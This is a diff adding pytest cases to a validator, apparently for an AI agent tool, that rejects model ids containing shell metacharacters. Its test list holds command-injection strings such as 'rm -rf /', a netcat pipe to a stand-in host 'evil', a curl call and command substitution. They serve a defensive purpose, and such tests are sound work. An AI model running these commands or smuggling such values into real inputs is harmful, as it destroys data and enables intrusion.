@@ -211,6 +211,44 @@ def test_missing_rationale_rejected_on_every_kind(action_yaml):
         validate(raw, LIVE)
 
 
+@pytest.mark.parametrize(
+    "bad_model",
+    [
+        "claude; rm -rf /",
+        "claude | nc evil 1",
+        "claude && curl evil",
+        "claude`whoami`",
+        "claude$(id)",
+        "claude ${HOME}",
+        "claude model",  # whitespace
+        "claude'x",  # single quote
+        'claude"x',  # double quote
+        "claude>out",
+        "claude<in",
+        "claude(x)",
+    ],
+)
+def test_add_lane_model_with_shell_metacharacters_rejected(bad_model):
+    # FIX 2b: the model id is interpolated into the harness command line, so
+    # any shell metacharacter must be rejected at parse time.
+    with pytest.raises(DecisionValidationError, match="model"):
+        AddLaneAction(window="scout", harness="claude", model=bad_model, brief="b", rationale="r")
+
+
+@pytest.mark.parametrize(
+    "model",
+    ["claude-fable-5", "gpt-5.5", "anthropic/claude-3.5", "o1-preview", "claude:latest", "x"],
+)
+def test_add_lane_legit_model_ids_accepted(model):
+    action = AddLaneAction(window="scout", harness="claude", model=model, brief="b", rationale="r")
+    assert action.model == model
+
+
+def test_add_lane_model_none_accepted():
+    action = AddLaneAction(window="scout", harness="claude", brief="b", rationale="r")
+    assert action.model is None
+
+
 def test_add_lane_without_harness_and_cmd_rejected():
     raw = parse(
         fence(
